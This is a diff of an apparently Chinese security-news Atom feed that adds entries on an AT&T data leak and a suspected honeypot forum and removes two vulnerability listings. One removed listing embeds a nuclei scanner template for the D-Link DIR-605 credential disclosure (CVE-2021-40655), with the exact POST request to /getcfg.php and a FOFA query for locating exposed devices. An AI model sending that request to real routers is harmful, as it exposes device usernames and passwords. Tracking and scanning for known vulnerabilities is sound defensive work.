@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-05T02:30:15.301Z</updated>
+  <updated>2025-06-05T02:50:47.056Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,60 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>黑客泄露 AT&amp;T 8600 万条记录，其中包含解密的 SSN</title>
+    <link href="http://example.com/2025/06/05/weixin_2897009669/"/>
+    <id>http://example.com/2025/06/05/weixin_2897009669/</id>
+    <published>2025-06-05T02:50:47.059Z</published>
+    <updated>2025-06-05T02:50:47.056Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/curGnfjCZvbvWiPMFW9OJA">https://mp.weixin.qq.com/s/curGnfjCZvbvWiPMFW9OJA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/curGnfjCZvbvWiPMFW9OJA&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【蜜罐预警】疑似 BF 蜜罐上线breach-forums[.]st</title>
+    <link href="http://example.com/2025/06/05/weixin_3733213756/"/>
+    <id>http://example.com/2025/06/05/weixin_3733213756/</id>
+    <published>2025-06-05T02:50:46.209Z</published>
+    <updated>2025-06-05T02:50:46.208Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/xfX3QTzmsYxa73ATqKWINA">https://mp.weixin.qq.com/s/xfX3QTzmsYxa73ATqKWINA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/xfX3QTzmsYxa73ATqKWINA&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>QNAP Photo Station 路径遍历漏洞</title>
@@ -522,64 +576,6 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="Nday Poc" scheme="http://example.com/tags/Nday-Poc/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>M7s UI download 任意文件读取漏洞</title>
-    <link href="http://example.com/2025/06/04/weixin_3132784738/"/>
-    <id>http://example.com/2025/06/04/weixin_3132784738/</id>
-    <published>2025-06-04T13:09:03.560Z</published>
-    <updated>2025-06-05T02:02:52.405Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> Nday Poc</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/o0kIRFB7PrDpC-8_FqierQ">https://mp.weixin.qq.com/s/o0kIRFB7PrDpC-8_FqierQ</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; Nday Poc&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/o0kIRFB7PrDpC-8_FqierQ&quot;&gt;https://mp.weixin.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="Nday Poc" scheme="http://example.com/tags/Nday-Poc/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>D-Link DIR-605 信息泄露漏洞</title>
-    <link href="http://example.com/2025/06/04/github_4238337556/"/>
-    <id>http://example.com/2025/06/04/github_4238337556/</id>
-    <published>2025-06-04T13:00:32.723Z</published>
-    <updated>2025-06-05T02:02:52.193Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> D-Link DIR-605 信息泄露漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2021-40655</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> D-LINK-DIR-605 B2固件版本2.01MT存在信息泄露问题。攻击者可以通过向&#x2F;getcfg.php页面伪造POST请求获取用户名和密码。</p><p><strong>产品厂商：</strong> dlink</p><p><strong>产品名称：</strong> dir-605l_firmware</p><p><strong>影响版本：</strong> 2.01mt</p><p><strong>搜索语法：</strong> body&#x3D;”l_tb&gt;DIR-605”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/f9b97f2ce5bf995bf1fd742daa2cb0f125a8c85e/http%2Fcves%2F2021%2FCVE-2021-40655.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/f9b97f2ce5bf995bf1fd742daa2cb0f125a8c85e/http%2Fcves%2F2021%2FCVE-2021-40655.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">40655</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> D-Link DIR-<span class="hljs-number">605</span> <span class="hljs-operator">-</span> Information Disclosure<br>  <span class="hljs-params">author:</span> DhiyaneshDK<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |<br>    An informtion disclosure issue exists <span class="hljs-keyword">in</span> D-LINK-DIR-<span class="hljs-number">605</span> B2 Firmware Version <span class="hljs-operator">-</span> <span class="hljs-number">2.01</span>MT. An attacker can obtain a user name and password by forging a post request to the <span class="hljs-symbol">/</span> getcfg.php page<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/cve-2021-40655</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>github.com<span class="hljs-operator">/</span>Ilovewomen<span class="hljs-operator">/</span>D-LINK-DIR-<span class="hljs-number">605</span><span class="hljs-symbol">/</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:N<span class="hljs-operator">/</span>A:N<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">7.5</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">40655</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">863</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.91874</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.99681</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:o:dlink:dir-<span class="hljs-number">605</span>l_firmware:<span class="hljs-number">2.01</span>mt:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">vendor:</span> dlink<br>    <span class="hljs-params">product:</span> dir-<span class="hljs-number">605</span>l_firmware<br>    <span class="hljs-params">fofa-query:</span> body<span class="hljs-operator">=</span><span class="hljs-string">&quot;l_tb&gt;DIR-605&quot;</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>  <span class="hljs-params">tags:</span> cve,cve2021,dlink,kev,dir-<span class="hljs-number">605</span>,info-leak<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/getcfg.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br>        <span class="hljs-params">Cookie:</span><br>        <span class="hljs-params">X-Forwarded-For:</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><br>        <span class="hljs-attr">SERVICES</span><span class="hljs-operator">=</span>DEVICE.ACCOUNT&amp;AUTHORIZED_GROUP<span class="hljs-operator">=</span><span class="hljs-number">1</span>%<span class="hljs-number">0</span>a<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;status_code <span class="hljs-operator">==</span> <span class="hljs-number">200</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;contains(content_type, <span class="hljs-string">&quot;text/xml&quot;</span>)&#x27;<br>          <span class="hljs-operator">-</span> &#x27;contains(body, <span class="hljs-string">&quot;DEVICE.ACCOUNT&quot;</span>)&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; D-Link DIR-605 信息泄露漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2021-40655&lt;/li&gt;
-&lt;/ul&gt;
-&lt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
     
   </entry>
   
